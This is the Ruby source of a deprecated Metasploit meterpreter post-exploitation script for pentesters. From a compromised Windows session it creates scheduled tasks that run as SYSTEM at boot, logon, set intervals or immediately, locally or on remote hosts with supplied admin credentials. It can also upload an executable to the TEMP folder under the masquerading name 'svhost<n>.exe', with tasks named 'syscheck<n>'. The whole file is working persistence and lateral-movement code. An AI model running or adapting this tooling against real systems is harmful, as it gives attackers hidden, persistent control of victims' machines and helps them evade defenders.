##
# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
# If you'd like to improve this script, please try to port it as a post
# module instead. Thank you.
##



#Meterpreter script for automating the most common scheduling tasks
#during a pentest. This script will use the schtasks command so as
#to provide future compatibility since MS will retire the AT command
#in future versions of windows. This script works with Windows XP,
#Windows 2003, Windows Vista and Windows 2008.
#Version: 0.1.2
#Note: in Vista UAC must be disabled to be able to perform scheduling
#and the meterpreter must be running under the profile of local admin
#or system.
################## Variable Declarations ##################
session = client
@@exec_opts = Rex::Parser::Arguments.new(
  "-h" => [ false,"Help menu." ],
  "-c" => [ true,"Command to execute at the given time. If options for execution needed use double quotes"],
  "-d" => [ false,"Daily." ],
  "-H" => [ true,"Every specified hours 1-23."],
  "-m" => [ true, "Every specified amount of minutes 1-1439"],
  "-e" => [ true, "Executable or script to upload to target host, will not work with remote schedule"],
  "-l" => [ false,"When a user logs on."],
  "-o" => [ true,"Options for executable when upload method used"],
  "-s" => [ false,"At system startup."],
  "-i" => [ false,"Run command imediatly and only once."],
  "-r" => [ false,"Remote Schedule. Executable has to be already on remote target"],
  "-u" => [ false,"Username of account with administrative privelages."],
  "-p" => [ false,"Password for account provided."],
  "-t" => [ true,"Remote system to schedule job."]
)
################## function declaration Declarations ##################
def usage()
  print_line("Scheduleme -- provides most common scheduling types used during a pentest")
  print_line("This script can upload a given executable or script and schedule it to be")
  print_line("executed. All scheduled task are run as System so the Meterpreter process")
  print_line("must be System or local admin for local schedules and Administrator for")
  print_line("remote schedules")
  print_line(@@exec_opts.usage)
end

#---------------------------------------------------------------------------------------------------------
def scheduleme(session,schtype,cmd,tmmod,cmdopt,username,password)
  execmd = ""
  success = false
  taskname = "syscheck#{rand(100)}"
  if cmdopt != nil
    cmd = "#{cmd} #{cmdopt}"
  end
  case schtype
  when "startup"
    if username == nil
      execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\" /sc onstart /ru system"
    else
      execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\" /sc onstart /ru system /u #{username} /p #{password}"
    end
  when "login"
    if username == nil
      execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\" /sc onlogon /ru system"
    else
      execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\" /sc onlogon /ru system /u #{username} /p #{password}"
    end
  when "hourly"
    if username == nil
      execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\" /sc hourly /mo #{tmmod} /ru system"
    else
      execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\" /sc hourly /mo #{tmmod} /ru system /u #{username} /p #{password}"
    end
  when "daily"
    if username == nil
      execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\" /sc daily /mo #{tmmod} /ru system"
    else
      execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\" /sc daily /mo #{tmmod} /ru system /u #{username} /p #{password}"
    end
  when "minute"
    if username == nil
      execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\"  /sc minute /mo #{tmmod} /ru system"
    else
      execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\"  /sc minute /mo #{tmmod} /ru system /u #{username} /p #{password}"
    end
  when "now"
    if username == nil
      execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\"  /sc once /ru system /st 00:00:00"
    else
      execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\"  /sc once /ru system /st 00:00:00 /u #{username} /p #{password}"
    end
  end
  print_status("Scheduling command #{cmd} to run #{schtype}.....")
  r = session.sys.process.execute("cmd.exe /c #{execmd}", nil, {'Hidden' => 'true','Channelized' => true})
  while(d = r.channel.read)
    if d =~ /successfully been created/
      print_status("The scheduled task has been successfully created")
      if username == nil
        print_status("For cleanup run schtasks /delete /tn #{taskname} /F")
      else
        print_status("For cleanup run schtasks /delete /tn #{taskname} /u #{username} /p #{password} /F")
      end
      success = true
    end
  end
  if !success
    print_status("Failed to create scheduled task!!")
  elsif success && schtype == "now"
    if username == nil
      session.sys.process.execute("cmd.exe /c schtasks /run /tn #{taskname}")
    else
      session.sys.process.execute("cmd.exe /c schtasks /run /tn #{taskname} /u #{username} /p #{password}")
    end
  end
  r.channel.close
  r.close

end
#---------------------------------------------------------------------------------------------------------
def scheduleremote(session,schtype,cmd,tmmod,cmdopt,targetsys,username,password)
  execmd = ""
  success = false
  taskname = "syscheck#{rand(100)}"
  if cmdopt != nil
    cmd = "#{cmd} #{cmdopt}"
  end
  case schtype
  when "startup"
    if username == nil
      execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\" /sc onstart /s #{targetsys} /ru system "
    else
      execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\" /sc onstart /s #{targetsys} /u #{username} /p #{password} /ru system "
    end
  when "login"
    if username == nil
      execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\" /sc onlogon /s #{targetsys} /ru system "
    else
      execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\" /sc onlogon /s #{targetsys} /u #{username} /p #{password} /ru system "
    end
  when "hourly"
    if username == nil
      execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\" /sc hourly /mo #{tmmod} /ru system /s #{targetsys}"
    else
      execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\" /sc hourly /mo #{tmmod} /ru system /s #{targetsys} /u #{username} /p #{password}"
    end
  when "daily"
    if username == nil
      execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\" /sc daily /mo #{tmmod} /ru system /s #{targetsys}"
    else
      execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\" /sc daily /mo #{tmmod} /ru system /s #{targetsys} /u #{username} /p #{password}"
    end
  when "minute"
    if username == nil
      execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\"  /sc minute /mo #{tmmod} /ru system /s #{targetsys}"
    else
      execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\"  /sc minute /mo #{tmmod} /ru system /s #{targetsys} /u #{username} /p #{password}"
    end
  when "now"
    if username == nil
      execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\"  /sc once /ru system /s #{targetsys} /st 00:00:00"
    else
      execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\"  /sc once /ru system /s #{targetsys} /st 00:00:00 /u #{username} /p #{password}"
    end
  end
  print_status("Scheduling command #{cmd} to run #{schtype}.....")
  r = session.sys.process.execute("cmd.exe /c #{execmd}", nil, {'Hidden' => 'true','Channelized' => true})
  while(d = r.channel.read)
    if d =~ /successfully been created/
      print_status("The scheduled task has been successfully created")
      print_status("For cleanup run schtasks /delete /tn #{taskname} /s #{targetsys}  /u #{username} /p #{password} /F")
      success = true
    end
  end
  if !success
    print_status("Failed to create scheduled task!!")
  elsif success && schtype == "now"
    if username == nil
      session.sys.process.execute("cmd.exe /c schtasks /run /tn #{taskname} /s #{targetsys}")
    else
      session.sys.process.execute("cmd.exe /c schtasks /run /tn #{taskname} /s #{targetsys} /u #{username} /p #{password}")
    end
  end
  r.channel.close
  r.close

end
#---------------------------------------------------------------------------------------------------------

def upload(session,file)
  location = session.sys.config.getenv('TEMP')
  fileontrgt = "#{location}\\svhost#{rand(100)}.exe"
  print_status("Uploading #{file}....")
  session.fs.file.upload_file("#{fileontrgt}","#{file}")
  print_status("#{file} uploaded!")
  return fileontrgt
end
# Parsing of Options
cmd = nil
file = nil
schtype = ""
tmmod = ""
cmdopt = nil
helpcall = 0
remote = 0
targetsys = nil
username = nil
password = nil
@@exec_opts.parse(args) { |opt, idx, val|
  case opt

  when "-c"
    cmd = val
  when "-e"
    file = val
  when "-d"
    tmmod = val
    schtype = "daily"
  when "-H"
    tmmod = val
    schtype = "hourly"
  when "-m"
    tmmod = val
    schtype = "minute"
  when "-s"
    schtype = "startup"
  when "-l"
    schtype = "login"
  when "-i"
    schtype = "now"
  when "-o"
    cmdopt = val
  when "-r"
    remote = 1
  when "-t"
    targetsys = val
  when "-u"
    username = val
  when "-p"
    password = val
  when "-h"
    helpcall = 1
  end

}
if client.platform == 'windows'
  if helpcall == 1
    usage()
  elsif cmd == nil && file == nil
    usage()
  elsif !is_uac_enabled? and is_admin?
    if file == nil
      if remote == 0
        scheduleme(session,schtype,cmd,tmmod,cmdopt,username,password)
      else
        scheduleremote(session,schtype,cmd,tmmod,cmdopt,targetsys,username,password)
      end
    else
      cmd = upload(session,file)
      scheduleme(session,schtype,cmd,tmmod,cmdopt,username,password)
    end
  else
    print_status("Meterpreter is not running under sufficient administrative rights.")
  end
else
  print_error("This version of Meterpreter is not supported with this Script!")
  raise Rex::Script::Completed
end
